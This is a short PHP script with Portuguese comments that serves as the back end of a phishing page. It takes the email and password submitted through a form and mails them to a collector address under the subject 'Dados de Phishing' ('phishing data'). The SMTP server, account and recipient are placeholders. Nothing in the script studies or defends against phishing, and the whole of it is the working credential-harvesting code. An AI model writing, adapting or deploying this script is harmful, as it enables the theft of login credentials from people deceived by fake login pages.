<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Captura os dados do formulário
    $email = $_POST['email'];
    $senha = $_POST['senha'];

    // Configurações do servidor SMTP
    $host = 'smtp.exemplo.com';
    $port = 587;
    $username = 'seu_email@exemplo.com';
    $password = 'sua_senha';
    
    // Endereço de e-mail para onde os dados serão enviados
    $destinatario = 'email_destinatario@exemplo.com';
    
    // Constrói o corpo do e-mail
    $assunto = 'Dados de Phishing';
    $mensagem = "Email: $email\nSenha: $senha";

    // Configurações adicionais para o envio de e-mail
    $cabecalhos = array(
        'From' => $username,
        'Reply-To' => $email,
        'X-Mailer' => 'PHP/' . phpversion()
    );

    // Envia o e-mail
    if (mail($destinatario, $assunto, $mensagem, $cabecalhos)) {
        echo "E-mail enviado com sucesso!";
    } else {
        echo "Erro ao enviar o e-mail.";
    }
}
?>
